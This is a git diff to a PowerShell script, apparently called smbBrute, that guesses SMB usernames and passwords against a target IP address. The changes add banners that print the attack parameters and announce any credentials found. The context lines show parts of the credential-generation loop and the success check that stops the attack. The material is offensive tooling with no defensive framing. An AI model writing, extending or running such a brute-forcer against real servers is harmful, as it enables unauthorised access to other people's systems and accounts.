@@ -7,11 +7,21 @@
   # Usernames can not contain   / \ [ ] : ; | = , + * ? < > %
   [int[]] $uc = (34, 47, 92, 91, 93, 58, 59, 124, 61, 44, 43, 42, 63, 60, 62, 37), # username constraints , chars that cant be used
   [int[]] $pc = 1 .. 31 #password constraints , chars that cant be used
-) # TODO: Try - catch blocks
+) # TODO: Try - catch blocks, help?
 
 # TODO: Add output file types XML, TXT, EXCEL
 Start-Transcript -path "smbBrute_$(get-date -f dd.MM.yyyy_HH.mm.ss).txt"
 
+Write-Host "**************************************************************************"
+Write-Host "SMB BRUTE IS WORKING ON " $IPAddr " SELECTED PARAMS:"
+Write-Host "LOWER BOUND FOR PASS: " $lb
+Write-Host "UPPER BOUND FOR PASS: " $ub
+Write-Host "INITIAL MAX LENGTH: " $ml
+Write-Host "MAX LENGTH INCREMENT VALUE: " $mli
+Write-Host "USERNAME CAN NOT CONTAIN: " $uc
+Write-Host "PASSWORD CAN NOT CONTAIN: " $pc
+Write-Host "**************************************************************************"
+            
 $OldMaxLength = 0
 
 function updateList{
@@ -64,8 +74,13 @@ while ($userPtr.Length -le $ml) {
            # TODO: Check if the server is on
         if ( $Result -ne $null ){
             Write-Host "SUCCESS -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
+            Write-Host "**************************************************************************"
+            Write-Host "BRUTE FORCING SMB CLIENT WORKED ON " $IPAddr "FOUND"
+            Write-Host "USERNAME: " $user " PASSWORD:" $pass
+            Write-Host "**************************************************************************"
             break outer
         }
+        
         Write-Host "FAILED -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
         $passPtr = updateList $passPtr $false
         $pass = createString $passPtr
@@ -89,4 +104,5 @@ $pass = createString $passPtr
 }
 }
 brute
+
 Stop-Transcript
